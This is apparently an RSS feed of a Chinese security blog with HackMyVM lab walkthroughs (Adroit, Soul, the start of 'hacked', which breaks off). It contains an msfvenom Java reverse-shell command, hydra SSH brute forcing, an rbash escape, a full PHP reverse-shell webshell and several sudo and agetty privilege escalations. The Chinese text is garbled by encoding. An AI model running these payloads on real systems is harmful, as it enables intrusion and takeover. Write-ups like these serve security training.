writer@192.168.80.11''s password:
Linux adroit 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jan 14 23:14:06 2021 from 10.0.2.15
writer@adroit:~$ id
uid=1000(writer) gid=1000(writer) groups=1000(writer),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
writer@adroit:~$ whoami
writer

<br>writer@adroit:~$ sudo -l
[sudo] password for writer:
Matching Defaults entries for writer on adroit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User writer may run the following commands on adroit:
    (root) /usr/bin/java -jar /tmp/testingmyapp.jar

<br>msfç”ŸæˆjaråŒ… åå¼¹shell<br>msfvenom -p java/shell_reverse_tcp lhost=192.168.80.5 lport=4444 -f jar -o reverse.jar

writer@adroit:/tmp$ cp reverse.jar  /tmp/testingmyapp.jar
writer@adroit:/tmp$ sudo -u root java -jar /tmp/testingmyapp.jar

[17:54:28] Welcome to pwncat ğŸˆ!                                                                       __main__.py:164
[17:56:16] received connection from 192.168.80.11:51550                                                     bind.py:84
[17:56:17] 0.0.0.0:4444: upgrading from /usr/bin/dash to /usr/bin/bash                                  manager.py:957
           192.168.80.11:51550: registered new host w/ db                                               manager.py:957
(local) pwncat$
(remote) root@adroit:/tmp# whoami
root
(remote) root@adroit:/root# ls
root.txt
(remote) root@adroit:/root# cat root.txt
017a030885f25af277dd891d0f151845
(remote) root@adroit:/root# cd /home/writer/
(remote) root@adroit:/home/writer# cat user.txt
61de3a25161dcb2b88b5119457690c3c
(remote) root@adroit:/home/writer#
<br>
æˆ‘è§‰å¾—è¿™ä¸ªé¶åœºä¸ç®—éš¾ã€‚éš¾ç‚¹åªæ˜¯åœ¨åˆ†æjavaä»£ç é‚£é‡Œï¼Œä¸è¿‡æˆ‘çœ‹ä¸æ‡‚java
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/36.adroit.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/36.Adroit.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164149.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164149.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[35.Soul]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. å›¾ç‰‡è§£å¯†" data-href="#3. å›¾ç‰‡è§£å¯†" href="https://www.c1trus.top/about:blank#3._å›¾ç‰‡è§£å¯†" class="internal-link" target="_self" rel="noopener nofollow">3. å›¾ç‰‡è§£å¯†</a>

<br><a data-tooltip-position="top" aria-label="3.1. çˆ†ç ´ç”¨æˆ·å" data-href="#3.1. çˆ†ç ´ç”¨æˆ·å" href="https://www.c1trus.top/about:blank#3.1._çˆ†ç ´ç”¨æˆ·å" class="internal-link" target="_self" rel="noopener nofollow">3.1. çˆ†ç ´ç”¨æˆ·å</a>
<br><a data-tooltip-position="top" aria-label="3.2. ç»•è¿‡rbash" data-href="#3.2. ç»•è¿‡rbash" href="https://www.c1trus.top/about:blank#3.2._ç»•è¿‡rbash" class="internal-link" target="_self" rel="noopener nofollow">3.2. ç»•è¿‡rbash</a>
<br><a data-tooltip-position="top" aria-label="3.3. ææƒæ£€æµ‹" data-href="#3.3. ææƒæ£€æµ‹" href="https://www.c1trus.top/about:blank#3.3._ææƒæ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">3.3. ææƒæ£€æµ‹</a>


<br><a data-tooltip-position="top" aria-label="4. è·å–webshell" data-href="#4. è·å–webshell" href="https://www.c1trus.top/about:blank#4._è·å–webshell" class="internal-link" target="_self" rel="noopener nofollow">4. è·å–webshell</a>

<br><a data-tooltip-position="top" aria-label="4.1. ä¿®æ”¹phpé…ç½®" data-href="#4.1. ä¿®æ”¹phpé…ç½®" href="https://www.c1trus.top/about:blank#4.1._ä¿®æ”¹phpé…ç½®" class="internal-link" target="_self" rel="noopener nofollow">4.1. ä¿®æ”¹phpé…ç½®</a>


<br><a data-tooltip-position="top" aria-label="5. www-dataææƒgabriel" data-href="#5. www-dataææƒgabriel" href="https://www.c1trus.top/about:blank#5._www-dataææƒgabriel" class="internal-link" target="_self" rel="noopener nofollow">5. www-dataææƒgabriel</a>
<br><a data-tooltip-position="top" aria-label="6. gabrielæå–åˆ°Peter" data-href="#6. gabrielæå–åˆ°Peter" href="https://www.c1trus.top/about:blank#6._gabrielæå–åˆ°Peter" class="internal-link" target="_self" rel="noopener nofollow">6. gabrielæå–åˆ°Peter</a>
<br><a data-tooltip-position="top" aria-label="7. Peterææƒroot" data-href="#7. Peterææƒroot" href="https://www.c1trus.top/about:blank#7._Peterææƒroot" class="internal-link" target="_self" rel="noopener nofollow">7. Peterææƒroot</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Soul" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Soul</a><br>
ä½œè€… sml<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br>ç«¯å£æ‰«æ<br>â”Œâ”€â”€(pwncat-env)â”€(rootã‰¿kali)-[/home/kali/hmv/Soul]
â””â”€# nmap  192.168.80.10 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 12:08 CST
Nmap scan report for 192.168.80.10
Host is up (0.00016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:FC:DB:8A (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.88 seconds

â”Œâ”€â”€(pwncat-env)â”€(rootã‰¿kali)-[/home/kali/hmv/Soul]
â””â”€# fscan -h 192.168.80.10

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.80.10:80 open
192.168.80.10:22 open
[*] alive ports len is: 2

<br>ç›®å½•æ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Soul]
â””â”€# dirsearch -u http://192.168.80.10/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/Soul/reports/http_192.168.80.10/__24-12-02_12-10-03.txt

Target: http://192.168.80.10/

[12:10:03] Starting:
[12:10:20] 200 -    9B  - /robots.txt

â”Œâ”€â”€(pwncat-env)â”€(rootã‰¿kali)-[/home/kali/hmv/Soul]
â””â”€# gobuster dir -u http://192.168.80.10 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.80.10
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,php,html,png,zip,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 24]
/robots.txt           (Status: 200) [Size: 9]
/saint.jpg            (Status: 200) [Size: 190523]
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
<br>ç½‘é¡µä¿¡æ¯<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Soul]
â””â”€# curl http://192.168.80.10/
 &lt;img src="saint.jpg"&gt;

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Soul]
â””â”€# curl http://192.168.80.10/robots.txt
/nothing

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Soul]
â””â”€# curl -o saint.jpg http://192.168.80.10/saint.jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  186k  100  186k    0     0   118M      0 --:--:-- --:--:-- --:--:--  181M

<br>saint.jpg<br>
<img alt="saint" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/saint.jpg" referrerpolicy="no-referrer"><br>åˆ°æ­¤ æˆ‘ä»¬å·²ç»åŸºæœ¬å®Œæˆä¿¡æ¯æ”¶é›†<br>
ç›®å‰å¾—åˆ°çš„æœ‰<br>
<br>å›¾ç‰‡ saint.jpg 
<br>é¦–é¡µ  &lt;img src="saint.jpg"&gt;
<br>å…³é”®è¯ saint
<br>ä¸‹ä¸€æ­¥æˆ‘ä»¬å¤§æ¦‚æœ‰è¿™å‡ ç§æ–¹å¼è¿›è¡Œ<br>
<br>è§£å¯†å›¾ç‰‡ã€‚çœ‹å›¾ç‰‡é‡Œé¢æ˜¯å¦å­˜åœ¨å¯ç”¨ä¿¡æ¯
<br>åˆ©ç”¨å…³é”®è¯ä½œä¸ºç”¨æˆ·åè¿›è¡Œsshçˆ†ç ´
<br><br>æ—¢ç„¶ç»™æˆ‘ä»¬çš„ä¸œè¥¿å¾ˆå°‘ï¼Œä¸”åªæœ‰ä¸€å¼ å›¾ã€‚é‚£ä¹ˆè¿™å¼ å›¾å¤šåŠæ˜¯æœ‰ä¸œè¥¿çš„<br>
åˆ©ç”¨<a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/StegSeekä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/StegSeekä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/stegseekä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">stegseek</a>å·¥å…·è§£å¯†<br>â”Œâ”€â”€(pwncat-env)â”€(rootã‰¿kali)-[/home/kali/hmv/Soul]
â””â”€# stegseek  saint.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "pass.txt".
[i] Extracting to "saint.jpg.out".
the file "saint.jpg.out" does already exist. overwrite ? (y/n)
y

â”Œâ”€â”€(pwncat-env)â”€(rootã‰¿kali)-[/home/kali/hmv/Soul]
â””â”€# cat saint.jpg.out
lionsarebigcats
<br>è·å–åˆ°ä¸€ä¸ªå…³é”®å­—ç¬¦ä¸² lionsarebigcats<br>å°è¯•åˆ©ç”¨è¿™ä¸ªä½œä¸ºå¯†ç ï¼Œå°† saint ä½œä¸ºç”¨æˆ·åè¿›è¡Œç™»å½•ã€‚ä½†æ˜¯å¤±è´¥äº†<br>
å¯èƒ½æ˜¯ç”¨æˆ·åé”™è¯¯äº†<br><br>çˆ†ç ´ä¸€ä¸‹ç”¨æˆ·å<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Soul]
â””â”€# hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p lionsarebigcats 192.168.80.10 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-02 12:43:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking ssh://192.168.80.10:22/
[22][ssh] host: 192.168.80.10   login: daniel   password: lionsarebigcats

<br>æˆåŠŸè·å–åˆ°ç”¨æˆ·å daniel<br>sshä¸Šæ¥åå‘ç°æˆ‘ä»¬åœ¨æ˜¯ä¸€ä¸ªé™åˆ¶æ¨¡å¼çš„bash rbashï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹æˆ‘ä»¬è®¸å¤šå‘½ä»¤éƒ½ç”¨ä¸äº† æ¯”å¦‚cdå‘½ä»¤<br>Last login: Thu Nov 26 05:27:42 2020 from 192.168.1.58
daniel@soul:~$ whoami
daniel
daniel@soul:~$ di
-rbash: di: command not found
daniel@soul:~$ id
uid=1000(daniel) gid=1000(daniel) groups=1000(daniel),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
daniel@soul:~$ cd /hotm
-rbash: cd: restricted

<br><br>è¿™ç¯‡æ–‡ç« é‡Œé¢æœ‰å¾ˆå¤šç§<a data-tooltip-position="top" aria-label="../æ¸—é€å§¿åŠ¿åº“/rbashç»•è¿‡" data-href="../æ¸—é€å§¿åŠ¿åº“/rbashç»•è¿‡" href="https://www.c1trus.top/24-æ¸—é€/æ¸—é€å§¿åŠ¿åº“/rbashç»•è¿‡.html" class="internal-link" target="_self" rel="noopener nofollow">rbashç»•è¿‡</a>æ–¹å¼<br>
<a rel="noopener nofollow" class="external-link" href="https://www.freebuf.com/vuls/376922.html" target="_blank">https://www.freebuf.com/vuls/376922.html</a><br>daniel@soul:~$ awk 'BEGIN {system("/bin/bash")}'
daniel@soul:~$ /
bash: /: Is a directory
<br><br>åˆ©ç”¨Linpeasè¿›è¡Œææƒæ£€æµ‹<br>
<img alt="Pasted image 20241202131134" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241202131134.png" referrerpolicy="no-referrer"><br>
æ£€æµ‹å‡º/usr/sbin/agetty å¾ˆæœ‰å¯èƒ½<br>ä½†æˆ‘ä»¬è¿™ä¸ªç”¨æˆ·ç”¨ä¸äº†<br>daniel@soul:/tmp$ /usr/sbin/agetty -o -p -l /bin/sh -a root tty
bash: /usr/sbin/agetty: Permission denied
<br>çœ‹æ¥è¦è½¬ç§»åˆ°peterç”¨æˆ·æ‰è¡Œ<br><br>åœ¨ç”¨æˆ·ç›®å½•é‡Œé¢æ²¡æœ‰çœ‹åˆ°å¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿<br>
å¯ä»¥å»ç½‘ç«™ç›®å½•çœ‹ä¸€ä¸‹<br>å‘ç°å¾ˆå¥‡æ€ªçš„ä¸€ç‚¹ï¼Œç½‘å€ç›®å½•çš„æƒé™æ˜¯777<br>drwxrwxrwx 2 root   root     4096 Nov 26  2020 .
drwxr-xr-x 3 root   root     4096 Nov 26  2020 ..
-rwxrwxrwx 1 root   root       24 Nov 26  2020 index.html
-rwxrwxrwx 1 root   root      612 Nov 26  2020 index.nginx-debian.html
-rwxrwxrwx 1 root   root        9 Nov 26  2020 robots.txt
-rwxrwxrwx 1 daniel daniel 190523 Nov 26  2020 saint.jpg
<br>åº”è¯¥æ˜¯å¸Œæœ›æˆ‘ä»¬å¾€è¿™é‡Œå†™ä¸€ä¸ªwebshell<br>å¾€é‡Œé¢å†™å…¥ä¸€ä¸ªwebshell<br>&lt;?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?&gt; 
<br>å¼€å¯ç›‘å¬å¼¹shell<br>å‘ç°æ²¡æœ‰å¼¹æˆåŠŸã€‚è€Œä¸”ç›´æ¥å›æ˜¾å‡ºäº†phpæ–‡ä»¶çš„å†…å®¹<br>
è¯´æ˜è¿™ä¸ªphpè§£ææœ‰é—®é¢˜<br><br>åœ¨è¿™ä¸ªé¶æœºä¸Šä½¿ç”¨çš„æ˜¯ Nginx æœåŠ¡å™¨<br>
nginxå¯¹PHP-FPMçš„é…ç½®æ–‡ä»¶ä¸€èˆ¬æ˜¯/etc/nginx/sites-available/default<br>
<img alt="Pasted image 20241202162008" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241202162008.png" referrerpolicy="no-referrer"><br>
å¯ä»¥å‘ç°phpçš„å¤„ç†è¢«æ³¨é‡Šæ‰äº†<br>
ä½†æ˜¯æˆ‘ä»¬å½“å‰ç”¨æˆ·ä¹Ÿä¸èƒ½ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶<br>è§‚å¯Ÿé…ç½®æ–‡ä»¶å¯ä»¥å‘ç°è¿™é‡Œæœ‰ä¸€ä¸ªåŸŸå lonelysoul.hmv<br>server {
        listen 80;
        listen [::]:80;
#
        server_name lonelysoul.hmv;
#
        root /var/www/html;
        index index.html;
#
        location / {
                try_files $uri $uri/ =404;
        }

 # pass PHP scripts to FastCGI server
        #
               location ~ \.php$ {
               include snippets/fastcgi-php.conf;
        #
        #       # With php-fpm (or other unix sockets):
               fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        #       # With php-cgi (or other tcp sockets):
        #       fastcgi_pass 127.0.0.1:9000;
        }
}


<br>lonelysoul.hmv é€šè¿‡ server_name åŒ¹é…åˆ°äº†ä¸€ä¸ªä¸“é—¨çš„é…ç½®å—ï¼Œè¯¥é…ç½®å—åŒ…å«äº†å¤„ç† PHP è¯·æ±‚çš„è§„åˆ™ã€‚<br>location / {
    try_files $uri $uri/ =404;
}
<br>
åœ¨é»˜è®¤æœåŠ¡å™¨å—ï¼ˆdefault_serverï¼‰çš„é…ç½®ä¸­ï¼Œlocation / å—åªæ˜¯å°è¯•å°†è¯·æ±‚ä½œä¸ºæ–‡ä»¶æˆ–ç›®å½•æ¥æŸ¥æ‰¾,å¹¶æ²¡æœ‰å°† .php æ–‡ä»¶è¯·æ±‚è½¬å‘ç»™ PHP-FPMï¼Œæ‰€ä»¥é»˜è®¤æœåŠ¡å™¨å—æ— æ³•è§£æ PHP æ–‡ä»¶ï¼Œåªä¼šè¿”å› 404 é”™è¯¯
<br>é…ç½®etc/hosts <br>vim /etc/hosts
192.168.80.10 lonelysoul.hmv
<br>å¼€å¯ç›‘å¬å¼¹shell<br>nc -lvnp 1234
curl http://lonelysoul.hmv/shell.php

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
<br><br>ææƒæ£€æµ‹ä¸€ä¸‹<br>
sudo -l
Matching Defaults entries for www-data on soul:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on soul:
    (gabriel) NOPASSWD: /tmp/whoami
<br>æç¤ºæˆ‘ä»¬å¯ä»¥ç”¨ gabriel ç”¨æˆ·çš„æƒé™æ‰§è¡Œ /tmp/whoami<br>
é‚£æˆ‘ä»¬å°†bashå¤åˆ¶åˆ°/tmp å¹¶æ”¹åwhoami å³å¯è·å–åˆ°gabrielç”¨æˆ·çš„bash<br>cp /bin/bash /tmp/whoami
sudo -u gabriel /tmp/whoami
whoami
gabriel
<br>æˆåŠŸè·å–åˆ° gabriel ç”¨æˆ·<br>gabriel@soul:~$ cat user.txt
HMViwazhere
<br><br>æ£€æµ‹ä¸€ä¸‹<br>sudo -l
Matching Defaults entries for gabriel on soul:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gabriel may run the following commands on soul:
    (peter) NOPASSWD: /usr/sbin/hping3

<br>æˆ‘ä»¬å¯ä»¥ç”¨ peter çš„æƒé™æ‰§è¡Œ /usr/sbin/hping3<br>gabriel@soul:~$ sudo -u peter /usr/sbin/hping3
hping3&gt; /bin/bash
peter@soul:/home/gabriel$
<br><br>è·å–åˆ°äº†Peterç”¨æˆ·æƒé™ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ agetty ææƒäº†<br>/peter@soul:/home/gabriel$ /usr/sbin/agetty -o -p -l /bin/sh -a root tty

Debian GNU/Linux 10 soul tty

soul login: root (automatic login)

\[\e]0;\u@\h: \w\a\]\u@\h:\w$
\[\e]0;\u@\h: \w\a\]\u@\h:\w$ id
uid=1002(peter) gid=1002(peter) euid=0(root) groups=1002(peter)
\[\e]0;\u@\h: \w\a\]\u@\h:\w$ whoami
root
cat /root/rootflag.txt
HMVohmygod
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/35.soul.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/35.Soul.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 15:02:55 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/saint.jpg" length="0" type="image/jpeg"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/saint.jpg"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[34.hacked]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ç›®å½•æ‰«æ" data-href="#2.2. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.2._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.3. è·å–å‚æ•°" data-href="#2.3. è·å–å‚æ•°" href="https://www.c1trus.top/about:blank#2.3._è·å–å‚æ•°" class="internal-link" target="_self" rel="noopener nofollow">2.3. è·å–å‚æ•°</a>


<br><a data-tooltip-position="top" aria-label="3. ææƒ" data-href="#3. ææƒ" href="https://www.c1trus.top/about:blank#3._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">3. ææƒ</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Hacked" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Hacked</a><br>
ä½œè€…  sml<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# fscan -h 192.168.42.185

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.42.185:22 open
192.168.42.185:80 open
<br>ä¸»é¡µ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# curl http://192.168.42.185/
HACKED BY h4x0r
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# dirsearch -u http://192.168.42.185/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/hacked/reports/http_192.168.42.185/__24-12-01_18-09-55.txt

Target: http://192.168.42.185/

[18:09:55] Starting:
[18:10:13] 200 -   16B  - /robots.txt
[18:10:14] 302 -   62B  - /simple-backdoor.php  -&gt;  /
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# curl http://192.168.42.185/robots.txt
/secretnote.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# curl http://192.168.42.185//secretnote.txt
[X] Enumeration
[X] Exploitation
[X] Privesc
[X] Maintaining Access.
 |__&gt; Webshell installed.
 |__&gt; Root shell created.

-h4x0r

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
â””â”€# curl http://192.168.42.185//simple-backdoor.php
I modified this webshell to only execute my secret parameter.
<br>æ”¶é›†åˆ°çš„ä¿¡æ¯<br>ç”¨æˆ· h4x0r 
webshell    /simple-backdoor.php
æ‰§è¡Œå‚æ•° æœªçŸ¥
<br><br>ä»æ”¶é›†çš„è¿™äº›ä¿¡æ¯å½“ä¸­çŒœæµ‹Webshellçš„å‚æ•°<br>
è¯•äº†å‡ ä¸ªå‚æ•°éƒ½ä¸å¯¹ã€‚çŒœæµ‹å¯èƒ½æ˜¯éœ€è¦çˆ†ç ´æ‰è¡Œ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hacked]
